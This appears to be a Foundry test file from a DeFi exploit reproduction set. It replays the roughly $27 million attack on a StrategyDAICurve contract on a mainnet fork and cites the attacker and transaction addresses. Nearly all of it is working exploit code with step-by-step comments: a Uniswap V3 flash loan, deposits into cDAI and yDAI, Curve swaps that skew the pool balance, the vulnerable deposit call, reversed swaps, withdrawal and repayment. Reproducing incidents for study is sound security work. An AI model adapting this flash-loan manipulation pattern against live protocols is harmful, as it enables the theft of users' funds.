// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~27,174K USD$
// Attacker : https://etherscan.io/address/0x0e816b0d0a66252c72af822d3e0773a2676f3278
// Attack Contract : https://etherscan.io/address/0x2d7973177d594237a9b347cd41082af4cbb40f2b
// Vulnerable Contract : https://etherscan.io/address/0xaf274e912243b19b882f02d731dacd7cd13072d0
// Attack Tx : https://etherscan.io/tx/0xcff84cc137c92e427f720ca1f2b36fbad793f34ec5117eed127060686e6797b1

// @Analysis
// https://twitter.com/numencyber/status/1666346419702362112

interface IcDAI {
    function balanceOf(address owner) external view returns (uint256);

    function deposit(uint256 _amount, bool _autoStakeInStakingPool) external;

    function withdraw(uint256 _shares, bool _autoWithdrawInStakingPool) external;
}

interface IyDAI {
    function balanceOf(address owner) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function deposit(uint256 _amount) external;

    function withdraw(uint256 _shares) external;
}

interface ICurveSwap {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IStrategyCurve {
    function deposit() external;
}

contract ContractTest is Test {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    // Compounder DAI Stablecoin
    IcDAI cDAI = IcDAI(0x2381742592ab54dC2e89f193AF682D914A8b24C1);
    // iearn DAI
    IyDAI yDAI = IyDAI(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
    IERC20 yUSDC = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    IERC20 yUSDT = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 yTUSD = IERC20(0x73a052500105205d34Daf004eAb301916DA8190f);
    IERC20 CentreUSDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    Uni_Pair_V3 DAIUSDCPool = Uni_Pair_V3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    ICurveSwap CurveFiSwap = ICurveSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IStrategyCurve StrategyDAICurve = IStrategyCurve(0xaf274e912243b19B882f02d731dacd7CD13072D0);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_426_064);
        cheats.label(address(DAI), "DAI");
        cheats.label(address(cDAI), "cDAI");
        cheats.label(address(yDAI), "yDAI");
        cheats.label(address(yUSDC), "yUSDC");
        cheats.label(address(yUSDT), "yUSDT");
        cheats.label(address(yTUSD), "yTUSD");
        cheats.label(address(CentreUSDC), "CentreUSDC");
        cheats.label(address(DAIUSDCPool), "DAIUSDCPool");
        cheats.label(address(CurveFiSwap), "CurveFiSwap");
        cheats.label(address(StrategyDAICurve), "StrategyDAICurve");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker amount of DAI before hack", DAI.balanceOf(address(this)), DAI.decimals());

        // Step 1. Flashloan 1_239 DAI through Uniswap V3 flash loans
        DAIUSDCPool.flash(address(this), 1_239_990 * 1e18, 0, "");

        emit log_named_decimal_uint("Attacker amount of DAI after hack", DAI.balanceOf(address(this)), DAI.decimals());
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // Approvals
        DAI.approve(address(yDAI), type(uint256).max);
        DAI.approve(address(cDAI), type(uint256).max);
        yDAI.approve(address(CurveFiSwap), type(uint256).max);
        yUSDC.approve(address(CurveFiSwap), type(uint256).max);
        yUSDT.approve(address(CurveFiSwap), type(uint256).max);
        yTUSD.approve(address(CurveFiSwap), type(uint256).max);

        // Step 2. Deposit 200_000 DAI and 1_000_000 DAI. Receive ~ 1_340_000 cDAI and 880_000 yDAI, respectively
        cDAI.deposit(200_000 * 1e18, false);
        yDAI.deposit(1_000_000 * 1e18);

        // Step 3. Exchange 50_000 yDAI for ~41_000 yUSDC, 160,000 yDAI for ~94,000 yTUSD and the rest of yDAI balance for ~48,693,900 yUSDT
        CurveFiSwap.exchange(0, 1, 50_000 * 1e18, 0);
        CurveFiSwap.exchange(0, 3, 160_000 * 1e18, 0);
        CurveFiSwap.exchange(0, 2, yDAI.balanceOf(address(this)), 0);

        // Step 4. Withdraw deposit ~1_340_000 cDAI and immediately call the StrategyDAICurve deposit function
        // This step involved depositing all the current DAI tokens into the contract and adding yDAI liquidity, which disrupted the balance of the trading pair
        DAI.transfer(address(StrategyDAICurve), DAI.balanceOf(address(this)));
        cDAI.withdraw(cDAI.balanceOf(address(this)), false);
        StrategyDAICurve.deposit();

        // Step 5. Reverse 3 conversions from step 3
        CurveFiSwap.exchange(1, 0, yUSDC.balanceOf(address(this)), 0);
        CurveFiSwap.exchange(2, 0, yUSDT.balanceOf(address(this)), 0);
        CurveFiSwap.exchange(3, 0, yTUSD.balanceOf(address(this)), 0);

        // Step 6. Release accumulated yDAI from deposit (~910_000 yDAI). The result of this step is withdrawal of ~1_030_000 DAI
        yDAI.withdraw(yDAI.balanceOf(address(this)));

        // Step 7. Repay flashloan.
        DAI.transfer(address(DAIUSDCPool), 1_239_990 * 1e18 + fee0);
    }
}
